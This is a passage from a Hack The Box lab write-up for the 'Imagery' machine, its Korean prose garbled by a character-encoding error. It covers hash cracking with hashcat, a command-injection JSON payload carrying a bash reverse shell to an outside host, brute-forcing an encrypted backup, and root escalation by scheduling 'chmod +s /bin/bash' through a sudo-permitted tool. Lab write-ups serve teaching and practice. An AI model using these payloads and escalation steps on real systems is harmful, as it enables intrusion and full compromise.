MD5 í•´ì‹œ ë°©ì‹ìœ¼ë¡œ ì•”í˜¸í™”ëœ `testuser` ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ í¬ë™í•œ ê²°ê³¼, ë‹¤ìŒê³¼ ê°™ì€ í‰ë¬¸ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì–»ì„ ìˆ˜ ìˆì—ˆë‹¤:

```bash
$ hashcat -m 0 hash.txt --show /usr/share/wordlists/rockyou.txt

2c65c8d7bfbca32a3ed42596192384f6:iambatman
```

---

# Exploitation

## Command Injection (RCE)

`testuser` ê³„ì •ìœ¼ë¡œ ë¡œê·¸ì¸ì— ì„±ê³µí•˜ë©´, ì•„ë˜ì™€ ê°™ì´ **Manage Groups** ë²„íŠ¼ì´ í¬í•¨ëœ ëŒ€ì‹œë³´ë“œ í™”ë©´ì— ì ‘ê·¼í•  ìˆ˜ ìˆë‹¤:

![testuser ëŒ€ì‹œë³´ë“œ](/assets/htb-linux/imagery/testuser.png)

`testuser` ê³„ì •ì´ ì¼ë°˜ ì‚¬ìš©ì ë° ê´€ë¦¬ì ê³„ì •ê³¼ëŠ” ë‹¤ë¥´ê²Œ, **isTestuser** í”Œë˜ê·¸ê°€ ì„¤ì •ëœ íŠ¹ìˆ˜ ê³„ì •ì„ì„ ì˜ë¯¸í•œë‹¤. í•´ë‹¹ ê³„ì •ìœ¼ë¡œ ë¡œê·¸ì¸ ì‹œ, ì´ë¯¸ì§€ì— ëŒ€í•œ ë‹¤ì–‘í•œ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì´ í™œì„±í™”ëœë‹¤:

![ë‹¤ì–‘í•œ ì‘ì—… ê¸°ëŠ¥](/assets/htb-linux/imagery/testuser-option.png)

ì´í›„ **Transform Iamge**ë¥¼ í´ë¦­í•˜ê²Œ ë˜ë©´, ì•ì„œ ë¶„ì„í•œ ì†ŒìŠ¤ì½”ë“œì—ì„œ í™•ì¸í–ˆë˜ `transformType` ë³€ìˆ˜ê°€ `Crop` ì¼ ê²½ìš°ì— **Command Injection** ì´ ê°€ëŠ¥í•´ì§€ëŠ” ì§€ì ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤:

![ì·¨ì•½í•œ ê³³ í™•ì¸](/assets/htb-linux/imagery/transform.png)

**Apply Transformation** ë²„íŠ¼ì„ í´ë¦­í•˜ì—¬ ì´ë¯¸ì§€ë¥¼ ë³€í™˜í•œ í›„, `Burp Suite` ë¥¼ í†µí•´ ìš”ì²­ ë° ì‘ë‹µ ë‚´ìš©ì„ í™•ì¸í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì€ íŒŒë¼ë¯¸í„°ë“¤ì´ í¬í•¨ë˜ì–´ ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤:

![Burp Suite](/assets/htb-linux/imagery/parameter.png)

ê·¸ í›„, ì´ì „ì— í™•ì¸í•œ **Command Injection** ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬, `params` ë‚´ `x` íŒŒë¼ë¯¸í„°ì— ë‹¤ìŒê³¼ ê°™ì€ ë¦¬ë²„ìŠ¤ ì…¸ ëª…ë ¹ì–´ë¥¼ ì‚½ì…í•˜ì˜€ë‹¤:

```bash
$ nc -lvnp 9001

listening on [any] 9001 ..
```

ì´í›„, ìœ„ `x` íŒŒë¼ë¯¸í„°ì— ë¦¬ë²„ìŠ¤ ì…¸ì„ ì‚½ì…í•˜ì˜€ë‹¤:

```json
{"imageId":"ff8015a8-bccf-47ba-90ac-35072fe13529","transformType":"crop","params":{"x":"$(bash -c 'bash -i >& /dev/tcp/10.10.14.76/9001 0>&1')","y":0,"width":1200,"height":1200}}
```

ìš”ì²­ì„ ì „ì†¡í•˜ì, ì„œë²„ì—ì„œ ëª…ë ¹ì–´ê°€ ì‹¤í–‰ë˜ë©° `web` ê¶Œí•œì˜ ë¦¬ë²„ìŠ¤ ì…¸ì„ ì„±ê³µì ìœ¼ë¡œ íšë“í•  ìˆ˜ ìˆì—ˆë‹¤:

![ì›¹ ì…¸ íšë“](/assets/htb-linux/imagery/web-shell.png)

---

# Privilege Escalation

## Lateral Movement: web â†’ mark

### Discovery and Decryption of Encrypted Web Backup

[Linpeas](https://github.com/peass-ng/PEASS-ng/tree/master) ë„êµ¬ë¥¼ í™œìš©í•˜ì—¬ ê¶Œí•œ ìƒìŠ¹ê³¼ ê´€ë ¨ëœ ì‹œìŠ¤í…œ ì •ë³´ë¥¼ ì—´ëŒí•˜ë˜ ì¤‘, `/var/backup` ë””ë ‰í† ë¦¬ì—ì„œ **AES**ë¡œ ì•”í˜¸í™”ëœ ì›¹ ë°±ì—… ì••ì¶• íŒŒì¼ì„ ë°œê²¬í•  ìˆ˜ ìˆì—ˆë‹¤:

```bash
â•”â•â•â•â•â•â•â•â•â•â•â•£ Backup folders

# [SKIP]

drwxr-xr-x 2 root root 4096 Sep 22 18:56 /var/backup
total 22516
-rw-rw-r-- 1 root root 23054471 Aug  6  2024 web_20250806_120723.zip.aes
```

`web_20250806_120723.zip.aes` íŒŒì¼ì„ ë¡œì»¬ë¡œ ë‹¤ìš´ë¡œë“œ ë°›ì€ í›„ `file` ëª…ë ¹ì–´ë¥¼ í†µí•´ ë¶„ì„í•´ë³´ë©´, í•´ë‹¹ íŒŒì¼ì´ `pyAesCrypt 6.1.1` ë²„ì „ìœ¼ë¡œ ì•”í˜¸í™”ë˜ì–´ ìˆìŒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤:

```bash
$ file web_20250806_120723.zip.aes       
                 
web_20250806_120723.zip.aes: AES encrypted data, version 2, created by "pyAesCrypt 6.1.1"
```

`web_20250806_120723.zip.aes` íŒŒì¼ì˜ ë³µí˜¸í™”ë¥¼ ìœ„í•´ [dpyAesCrypt](https://github.com/Nabeelcn25/dpyAesCrypt.py) ë„êµ¬ë¥¼ í™œìš©í•˜ì˜€ë‹¤:

```bash
$ python3 dpyAesCrypt.py web_20250806_120723.zip.aes /usr/share/wordlists/rockyou.txt

[ğŸ”] dpyAesCrypt.py â€“ pyAesCrypt Brute Forcer                                                                                                                                                                                             
                                                                                                                                                                                                                                          
[ğŸ”] Starting brute-force with 10 threads...
[ğŸ”„] Progress: â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘ 0.00% | ETA: 00:00:00 | Tried 0/14344392/home/kali/htb/iamgery/dpyAesCrypt.py:42: DeprecationWarning: inputLength parameter is no longer used, and might be removed in a future version
  pyAesCrypt.decryptStream(fIn, fOut, password.strip(), buffer_size, os.path.getsize(encrypted_file))
[ğŸ”„] Progress: â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘ 0.01% | ETA: 10:44:58 | Tried 1361/14344392

[âœ…] Password found: bestfriends                                                                                                                                                                                                          
ğŸ”“ Decrypt the file now? (y/n): y
/home/kali/htb/iamgery/dpyAesCrypt.py:142: DeprecationWarning: inputLength parameter is no longer used, and might be removed in a future version
  pyAesCrypt.decryptStream(fIn, fOut, cracked_pw, args.buffer, os.path.getsize(args.file))
[ğŸ“] File decrypted successfully as: web_20250806_120723.zip
```

í•´ë‹¹ AES ì•”í˜¸í™” íŒŒì¼ì˜ íŒ¨ìŠ¤ì›Œë“œëŠ” `bestfriends` ë¡œ í™•ì¸ë˜ì—ˆìœ¼ë©°, ë³µí˜¸í™”ì— ì„±ê³µí•˜ì—¬ ìµœì¢…ì ìœ¼ë¡œ ì••ì¶• íŒŒì¼ì¸ `web_20250806_120723.zip` ì„ í™•ë³´í•  ìˆ˜ ìˆì—ˆë‹¤.

### Discovery of mark Account 

ë³µí˜¸í™”ëœ `web_20250806_120723.zip` ì••ì¶• íŒŒì¼ì„ í’€ë©´, `web` ë””ë ‰í† ë¦¬ê°€ ìƒì„±ë˜ë©° ê·¸ ì•ˆì—ëŠ” ë°±ì—… ë‹¹ì‹œì˜ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ê´€ë ¨ íŒŒì¼ë“¤ì´ ì¡´ì¬í•œë‹¤:

```bash
$ ls -l 

total 92
-rw-rw-r-- 1 kali kali  9784 Aug  5 08:56 api_admin.py
-rw-rw-r-- 1 kali kali  6398 Aug  5 08:56 api_auth.py
-rw-rw-r-- 1 kali kali 11876 Aug  5 08:57 api_edit.py
-rw-rw-r-- 1 kali kali  9091 Aug  5 08:57 api_manage.py
-rw-rw-r-- 1 kali kali   840 Aug  5 08:58 api_misc.py
-rw-rw-r-- 1 kali kali 12082 Aug  5 08:58 api_upload.py
-rw-rw-r-- 1 kali kali  1943 Aug  5 15:21 app.py
-rw-rw-r-- 1 kali kali  1809 Aug  5 08:59 config.py
-rw-rw-r-- 1 kali kali  1503 Aug  6 12:07 db.json
drwxrwxr-x 5 kali kali  4096 Dec  9 19:59 env
drwxrwxr-x 2 kali kali  4096 Dec  9 19:59 __pycache__
drwxrwxr-x 2 kali kali  4096 Dec  9 19:59 system_logs
drwxrwxr-x 2 kali kali  4096 Dec  9 19:59 templates
-rw-rw-r-- 1 kali kali  4023 Aug  5 09:00 utils.py
```

ì‚¬ìš©ì ì •ë³´ë¥¼ ì €ì¥í•˜ëŠ” `db.json` íŒŒì¼ì„ ì—´ëŒí•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ ë“±ë¡ëœ ê³„ì •ë“¤ì˜ ìê²© ì¦ëª…ì´ í¬í•¨ë˜ì–´ ìˆë‹¤:

```json
{
    "users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "displayId": "f8p10uw0",
            "isTestuser": false,
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "displayId": "8utz23o5",
            "isTestuser": true,
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "mark@imagery.htb",
            "password": "01c3d2e5bdaf6134cec0a367cf53e535",
            "displayId": "868facaf",
            "isAdmin": false,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        },
        {
            "username": "web@imagery.htb",
            "password": "84e3c804cf1fa14306f26f9f3da177e0",
            "displayId": "7be291d4",
            "isAdmin": true,
            "failed_login_attempts": 0,
            "locked_until": null,
            "isTestuser": false
        }
    ],
    "images": [],
    "bug_reports": [],
    "image_collections": [
        {
            "name": "My Images"
        },
        {
            "name": "Unsorted"
        },
        {
            "name": "Converted"
        },
        {
            "name": "Transformed"
        }
    ]
}
```

ìœ„ ê³„ì • ëª©ë¡ ì¤‘, ì´ì „ **LFI**ë¥¼ í†µí•´ `db.json` íŒŒì¼ì— ì¡´ì¬í•˜ì§€ ì•Šì•˜ë˜ `web`, `mark` ê³„ì •ì„ ìƒˆë¡­ê²Œ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤. 

### Hashcrack

`mark` ì‚¬ìš©ìì˜ MD5 í•´ì‹œ ë¹„ë°€ë²ˆí˜¸ë¥¼ í¬ë™í•œ ê²°ê³¼, ë‹¤ìŒê³¼ ê°™ì€ í‰ë¬¸ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì–»ì„ ìˆ˜ ìˆì—ˆë‹¤:

```bash
$ hashcat -m 0 --show hash.txt /usr/share/wordlists/rockyou.txt

01c3d2e5bdaf6134cec0a367cf53e535:supersmash
```

ì´í›„ `su` ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•˜ì—¬ `mark` ê³„ì •ìœ¼ë¡œ ì „í™˜ì„ ì‹œë„í•˜ì˜€ê³ , í¬ë™ëœ ë¹„ë°€ë²ˆí˜¸ë¥¼ í†µí•´ ì…¸ì„ íšë“ì— ì„±ê³µí•˜ì˜€ë‹¤:

```bash
web@Imagery:~/web$ su mark
Password: supersmash

mark@Imagery:/home/web/web$
```

## Lateral Movement: mark â†’ root

### Enumerating sudo Privileges

`sudo -l` ëª…ë ¹ì–´ë¥¼ í†µí•´ `mark` ì‚¬ìš©ìê°€ ìˆ˜í–‰í•  ìˆ˜ ìˆëŠ” ê¶Œí•œì„ í™•ì¸í•œ ê²°ê³¼, ë‹¤ìŒê³¼ ê°™ì´ ì¶œë ¥ë˜ì—ˆë‹¤:

```bash
mark@Imagery:~$ sudo -l

Matching Defaults entries for mark on Imagery:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

ìœ„ ê²°ê³¼ë¥¼ í†µí•´ `mark` ì‚¬ìš©ìëŠ” ë¹„ë°€ë²ˆí˜¸ ì…ë ¥ ì—†ì´ `/usr/local/bin/charcol` ëª…ë ¹ì–´ë¥¼ ë£¨íŠ¸ ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.

### Abusing charcol for Privilege Escalation

`charcol` íŒŒì¼ì—ì„œ `help` ëª…ë ¹ì–´ë¥¼ í™•ì¸í•œ ê²°ê³¼, `-R`, `--reset-password-to-default` ì˜µì…˜ì„ í†µí•´ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì´ˆê¸°í™”í•  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì´ ì¡´ì¬í•¨ì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤:

```bash
mark@Imagery:~$ sudo /usr/local/bin/charcol help

usage: charcol.py [--quiet] [-R] {shell,help} ...

Charcol: A CLI tool to create encrypted backup zip files.

positional arguments:
  {shell,help}          Available commands
    shell               Enter an interactive Charcol shell.
    help                Show help message for Charcol or a specific command.

options:
  --quiet               Suppress all informational output, showing only
                        warnings and errors.
  -R, --reset-password-to-default
                        Reset application password to default (requires system
                        password verification).
```

`mark` ì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì´ìš©í•˜ì—¬ `charcol` CLI ë„êµ¬ì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì´ˆê¸°í™”í•˜ëŠ” ë° ì„±ê³µí•˜ì˜€ë‹¤:

```bash
mark@Imagery:~$ sudo /usr/local/bin/charcol -R shell

Attempting to reset Charcol application password to default.
[2025-12-10 01:39:08] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm: supersmash

[2025-12-10 01:39:31] [INFO] System password verified successfully.
Removed existing config file: /root/.charcol/.charcol_config
Charcol application password has been reset to default (no password mode).
```

ì´í›„ `shell` ëª…ë ¹ì–´ë¥¼ ë‹¤ì‹œ ì‹¤í–‰í•œ ë’¤, ë¹„ë°€ë²ˆí˜¸ ì—†ì´ ì‹¤í–‰ë˜ëŠ” **no password mode** ë¡œ ì„¤ì •í•˜ì˜€ë‹¤:

```bash
mark@Imagery:~$ sudo /usr/local/bin/charcol shell

First time setup: Set your Charcol application password.
Enter '1' to set a new password, or press Enter to use 'no password' mode: 

Are you sure you want to use 'no password' mode? (yes/no): yes

[2025-12-10 01:39:56] [INFO] Default application password choice saved to /root/.charcol/.charcol_config
Using 'no password' mode. This choice has been remembered.
Please restart the application for changes to take effect.
```

ë‹¤ì‹œ `sudo /usr/local/bin/charcol shell` ëª…ë ¹ì–´ë¥¼ í†µí•´ `charcol` ì¸í„°í˜ì´ìŠ¤ë¡œ ì§„ì…í•œ í›„, `help` ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•˜ì—¬ ì‚¬ìš© ê°€ëŠ¥í•œ ëª…ë ¹ì–´ ëª©ë¡ì„ í™•ì¸í•˜ì˜€ë‹¤:

```bash
charcol> help

[2025-12-10 01:44:59] [INFO] 
Charcol Shell Commands:

# [SKIP]

  Automated Jobs (Cron):
    auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]
      Purpose: Add a new automated cron job managed by Charcol.
      Verification:
        - If '--app-password' is set (status 1): Requires Charcol application password (via global --app-password flag).
        - If 'no password' mode is set (status 2): Requires system password verification (in interactive shell).
      Security Warning: Charcol does NOT validate the safety of the --command. Use absolute paths.
      Examples:
        - Status 1 (encrypted app password), cron:
          CHARCOL_NON_INTERACTIVE=true charcol --app-password <app_password> auto add \
          --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs -p <file_password>" \
          --name "Daily Docs Backup" --log-output <log_file_path>
        - Status 2 (no app password), cron, unencrypted backup:
          CHARCOL_NON_INTERACTIVE=true charcol auto add \
          --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs" \
          --name "Daily Docs Backup" --log-output <log_file_path>
        - Status 2 (no app password), interactive:
          auto add --schedule "0 2 * * *" --command "charcol backup -i /home/user/docs" \
          --name "Daily Docs Backup" --log-output <log_file_path>
          (will prompt for system password)

    auto list
      Purpose: List all automated jobs managed by Charcol.
      Example:
        auto list

    auto edit <job_id> [--schedule "<new_schedule>"] [--command "<new_command>"] [--name "<new_name>"] [--log-output <new_log_file>]
      Purpose: Modify an existing Charcol-managed automated job.
      Verification: Same as 'auto add'.
      Example:
        auto edit <job_id> --schedule "30 4 * * *" --name "Updated Backup Job"

# [SKIP]
```

ìœ„ì™€ ê°™ì´ `auto add` ëª…ë ¹ì„ í†µí•´ **Cron ê¸°ë°˜ ìë™ ì‘ì—…ì„ ì¶”ê°€**í•  ìˆ˜ ìˆìœ¼ë©°, `--command` ì˜µì…˜ì„ í†µí•´ ì›í•˜ëŠ” ì…¸ ëª…ë ¹ì„ ì‹¤í–‰í•˜ë„ë¡ ì„¤ì •í•  ìˆ˜ ìˆë‹¤.

ë§¤ ë¶„ë§ˆë‹¤ ì‹¤í–‰ë˜ëŠ” `chmod +s /bin/bash` ëª…ë ¹ì–´ë¥¼ `root-shell` ì´ë¦„ìœ¼ë¡œ ë“±ë¡í•˜ì˜€ê³ , ë‹¤ìŒê³¼ ê°™ì´ ì‘ì—…ì´ ì„±ê³µì ìœ¼ë¡œ ì¶”ê°€ëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤:

```bash
charcol> auto add --schedule "* * * * *" --command "chmod +s /bin/bash" --name "root-shell" 

[2025-12-10 01:50:45] [INFO] System password verification required for this operation.
Enter system password for user 'mark' to confirm: supersmash

[2025-12-10 01:50:54] [INFO] System password verified successfully.
[2025-12-10 01:50:54] [INFO] Auto job 'root-shell' (ID: 9e85d6ef-270e-4709-8883-50b6738b5e31) added successfully. The job will run according to schedule.
[2025-12-10 01:50:54] [INFO] Cron line added: * * * * * CHARCOL_NON_INTERACTIVE=true chmod +s /bin/bash
```

ì¼ì • ì‹œê°„ì´ ì§€ë‚œ ë’¤ `/bin/bash` íŒŒì¼ì˜ ê¶Œí•œì„ í™•ì¸í•´ë³´ë©´, SUID ë¹„íŠ¸ê°€ ì •ìƒì ìœ¼ë¡œ ì„¤ì •ëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤:

```bash
mark@Imagery:~$ ls -l /bin/bash

-rwsr-sr-x 1 root root 1474768 Oct 26  2024 /bin/bash
```

ì´í›„, `-p` ì˜µì…˜ì„ ì´ìš©í•˜ì—¬ `/bin/bash` ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•˜ë©´ ë£¨íŠ¸ ê¶Œí•œì˜ ì…¸ì„ íšë“í•˜ëŠ” ë° ì„±ê³µí•˜ì˜€ë‹¤:

```bash
mark@Imagery:~$ /bin/bash -p

bash-5.2# 
```

ìµœì¢…ì ìœ¼ë¡œ `root.txt` íŒŒì¼ì„ ì½ì–´ í”Œë˜ê·¸ë¥¼ íšë“í•˜ì˜€ë‹¤:

![ë£¨íŠ¸ í”Œë˜ê·¸ íšë“](/assets/htb-linux/imagery/flag.png)